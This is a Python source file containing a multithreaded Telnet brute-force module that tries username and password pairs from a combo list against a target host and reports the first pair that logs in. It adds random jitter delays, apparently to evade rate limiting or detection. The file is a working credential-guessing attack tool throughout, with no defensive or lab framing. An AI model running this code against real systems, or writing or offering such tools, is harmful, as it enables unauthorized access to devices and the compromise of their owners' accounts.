import telnetlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import random
import socket
import logging

class BruteForceTalent:
    def __init__(self, target_ip, target_port=23, combo_list=[], max_workers=10, max_errors=10):
        self.info = "Talent brute force module (enhanced)"
        self.targetIP = target_ip
        self.targetPORT = target_port
        self.combos = combo_list  # list of (username, password)
        self.max_workers = max_workers
        self.max_errors = max_errors
        self.lock = threading.Lock()
        self.found = False
        self.valid_cred = None
        self.error_count = 0

    def is_telnet_open(self):
        try:
            with socket.create_connection((self.targetIP, self.targetPORT), timeout=3):
                return True
        except:
            return False

    def attempt_login(self, username, password):
        if self.found or self.error_count >= self.max_errors:
            return None

        time.sleep(random.uniform(0.2, 1.0))  # jitter delay

        try:
            tn = telnetlib.Telnet(self.targetIP, self.targetPORT, timeout=5)

            tn.read_until(b"login: ", timeout=3)
            tn.write(username.encode('ascii') + b"\n")

            tn.read_until(b"Password: ", timeout=3)
            tn.write(password.encode('ascii') + b"\n")

            time.sleep(1)
            output = tn.read_very_eager()

            if b"incorrect" not in output.lower() and b"login failed" not in output.lower():
                with self.lock:
                    if not self.found:
                        self.found = True
                        self.valid_cred = (username, password)
                        logging.debug(f"Valid TELNET credentials found: {username}:{password}")
                tn.close()
                return (username, password)
            tn.close()
            return None

        except Exception as e:
            with self.lock:
                self.error_count += 1
            logging.debug(f"Error attempting {username}:{password} - {str(e)}")
            return None

    def run(self):
        if not self.is_telnet_open():
            logging.warning("Telnet port not open or target not reachable.")
            return None

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.attempt_login, u, p) for u, p in self.combos]

            for future in as_completed(futures):
                if self.found or self.error_count >= self.max_errors:
                    break

        return self.valid_cred if self.valid_cred else None